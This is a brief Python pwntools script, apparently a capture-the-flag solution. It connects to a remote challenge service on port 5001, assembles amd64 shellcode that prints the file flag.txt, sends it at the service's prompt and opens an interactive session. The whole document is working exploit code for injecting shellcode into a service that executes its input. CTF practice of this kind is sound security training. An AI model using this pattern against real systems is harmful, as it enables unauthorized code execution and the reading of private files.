from pwn import *
context.clear(arch="amd64")
p = remote("challenges.hackagou.nc", 5001)
shellcode = asm(shellcraft.cat('flag.txt'))
p.sendlineafter(b"?\n", shellcode)
p.interactive()
